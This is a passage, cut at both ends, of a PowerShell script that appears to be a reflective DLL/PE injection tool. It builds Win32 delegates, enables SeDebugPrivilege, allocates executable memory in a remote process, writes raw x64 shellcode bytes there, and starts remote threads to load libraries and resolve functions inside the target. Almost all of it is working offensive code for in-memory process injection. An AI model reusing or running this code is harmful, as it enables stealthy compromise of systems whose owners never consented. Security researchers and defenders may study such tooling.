        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges

		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue

		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf


        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }

		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process

		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread

		return $Win32Functions
	}









	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,

		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)

		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver

				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}


				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}

		return [BitConverter]::ToInt64($FinalBytes, 0)
	}


	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,

		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)

		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{

				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF

				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}

		return [BitConverter]::ToInt64($FinalBytes, 0)
	}


	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,

		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)

		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}

		return $false
	}


	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)

		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value

        return $Hex
    }


	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,

		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)

	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))

		$PEEndAddress = $PEInfo.EndAddress

		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}


	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,

			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)

		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}



	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]

	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),

	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')

	    Write-Output $TypeBuilder.CreateType()
	}



	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]

	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,

	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )


	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')

	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')

		Try
		{
			$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
		}
		Catch
		{
			$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress',
                                                            [reflection.bindingflags] "Public,Static",
                                                            $null,
                                                            [System.Reflection.CallingConventions]::Any,
                                                            @((New-Object System.Runtime.InteropServices.HandleRef).GetType(),
                                                            [string]),
                                                            $null)
		}


	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)


	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}


	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}

		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}

				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}

		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{

		}

		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}


	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,

		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,

		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,

		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)

		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero

		$OSVersion = [Environment]::OSVersion.Version

		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{

			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}

		else
		{

			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}

		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}

		return $RemoteThreadHandle
	}



	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		$NtHeadersInfo = New-Object System.Object


		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)


		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)


	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }

		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}

		return $NtHeadersInfo
	}



	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		$PEInfo = New-Object System.Object


		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null


		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types


		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)


		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)

		return $PEInfo
	}




	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}

		$PEInfo = New-Object System.Object


		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types


		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)

		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}

		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}

		return $PEInfo
	}


	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,

		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)

		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}

		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA")

		[IntPtr]$DllAddress = [IntPtr]::Zero


		if ($PEInfo.PE64Bit -eq $true)
		{

			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}



			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)

			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem

			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)


			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}

			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}

			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}


			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}

			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}

			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}

		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

		return $DllAddress
	}


	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,

		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,

		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero

        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)


		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }

        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }


		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress")



		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}




		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
